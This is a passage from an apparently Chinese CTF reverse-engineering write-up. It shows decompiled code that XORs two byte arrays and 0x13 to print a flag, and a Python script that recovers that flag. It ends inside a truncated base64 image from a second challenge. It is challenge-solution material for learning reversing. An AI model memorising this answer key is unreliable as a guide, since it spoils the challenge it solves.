class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sub_45A7BE((int)&quot;done!!! the flag is &quot;);</span><br><span class="line">v59 = 18;</span><br><span class="line">v60 = 64;</span><br><span class="line">v61 = 98;</span><br><span class="line">v62 = 5;</span><br><span class="line">v63 = 2;</span><br><span class="line">v64 = 4;</span><br><span class="line">v65 = 6;</span><br><span class="line">v66 = 3;</span><br><span class="line">v67 = 6;</span><br><span class="line">v68 = 48;</span><br><span class="line">v69 = 49;</span><br><span class="line">v70 = 65;</span><br><span class="line">v71 = 32;</span><br><span class="line">v72 = 12;</span><br><span class="line">v73 = 48;</span><br><span class="line">v74 = 65;</span><br><span class="line">v75 = 31;</span><br><span class="line">v76 = 78;</span><br><span class="line">v77 = 62;</span><br><span class="line">v78 = 32;</span><br><span class="line">v79 = 49;</span><br><span class="line">v80 = 32;</span><br><span class="line">v81 = 1;</span><br><span class="line">v82 = 57;</span><br><span class="line">v83 = 96;</span><br><span class="line">v84 = 3;</span><br><span class="line">v85 = 21;</span><br><span class="line">v86 = 9;</span><br><span class="line">v87 = 4;</span><br><span class="line">v88 = 62;</span><br><span class="line">v89 = 3;</span><br><span class="line">v90 = 5;</span><br><span class="line">v91 = 4;</span><br><span class="line">v92 = 1;</span><br><span class="line">v93 = 2;</span><br><span class="line">v94 = 3;</span><br><span class="line">v95 = 44;</span><br><span class="line">v96 = 65;</span><br><span class="line">v97 = 78;</span><br><span class="line">v98 = 32;</span><br><span class="line">v99 = 16;</span><br><span class="line">v100 = 97;</span><br><span class="line">v101 = 54;</span><br><span class="line">v102 = 16;</span><br><span class="line">v103 = 44;</span><br><span class="line">v104 = 52;</span><br><span class="line">v105 = 32;</span><br><span class="line">v106 = 64;</span><br><span class="line">v107 = 89;</span><br><span class="line">v108 = 45;</span><br><span class="line">v109 = 32;</span><br><span class="line">v110 = 65;</span><br><span class="line">v111 = 15;</span><br><span class="line">v112 = 34;</span><br><span class="line">v113 = 18;</span><br><span class="line">v114 = 16;</span><br><span class="line">v115 = 0;</span><br><span class="line">v2 = 123;</span><br><span class="line">v3 = 32;</span><br><span class="line">v4 = 18;</span><br><span class="line">v5 = 98;</span><br><span class="line">v6 = 119;</span><br><span class="line">v7 = 108;</span><br><span class="line">v8 = 65;</span><br><span class="line">v9 = 41;</span><br><span class="line">v10 = 124;</span><br><span class="line">v11 = 80;</span><br><span class="line">v12 = 125;</span><br><span class="line">v13 = 38;</span><br><span class="line">v14 = 124;</span><br><span class="line">v15 = 111;</span><br><span class="line">v16 = 74;</span><br><span class="line">v17 = 49;</span><br><span class="line">v18 = 83;</span><br><span class="line">v19 = 108;</span><br><span class="line">v20 = 94;</span><br><span class="line">v21 = 108;</span><br><span class="line">v22 = 84;</span><br><span class="line">v23 = 6;</span><br><span class="line">v24 = 96;</span><br><span class="line">v25 = 83;</span><br><span class="line">v26 = 44;</span><br><span class="line">v27 = 121;</span><br><span class="line">v28 = 104;</span><br><span class="line">v29 = 110;</span><br><span class="line">v30 = 32;</span><br><span class="line">v31 = 95;</span><br><span class="line">v32 = 117;</span><br><span class="line">v33 = 101;</span><br><span class="line">v34 = 99;</span><br><span class="line">v35 = 123;</span><br><span class="line">v36 = 127;</span><br><span class="line">v37 = 119;</span><br><span class="line">v38 = 96;</span><br><span class="line">v39 = 48;</span><br><span class="line">v40 = 107;</span><br><span class="line">v41 = 71;</span><br><span class="line">v42 = 92;</span><br><span class="line">v43 = 29;</span><br><span class="line">v44 = 81;</span><br><span class="line">v45 = 107;</span><br><span class="line">v46 = 90;</span><br><span class="line">v47 = 85;</span><br><span class="line">v48 = 64;</span><br><span class="line">v49 = 12;</span><br><span class="line">v50 = 43;</span><br><span class="line">v51 = 76;</span><br><span class="line">v52 = 86;</span><br><span class="line">v53 = 13;</span><br><span class="line">v54 = 114;</span><br><span class="line">v55 = 1;</span><br><span class="line">v56 = 117;</span><br><span class="line">v57 = 126;</span><br><span class="line">v58 = 0;</span><br><span class="line">for ( i = 0; i &lt; 56; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  *(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">  *(&amp;v2 + i) ^= 0x13u;</span><br><span class="line">&#125;</span><br><span class="line">return sub_45A7BE((int)&quot;%s\n&quot;);</span><br></pre></td></tr></table></figure><p>两个数组每位异或后再异或0x13得到flag，脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">a1=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0,]</span><br><span class="line">a2=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0,]</span><br><span class="line">for i in range(len(a1)):</span><br><span class="line">a1[i]^=a2[i]</span><br><span class="line">a1[i]^=0x13</span><br><span class="line">flag=&apos;&apos;.join([chr(i) for i in a1])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h1 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h1><p>windows下打不开，显示版本不对，ida没用，od也没用，用hex fiend看了一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/png;base64,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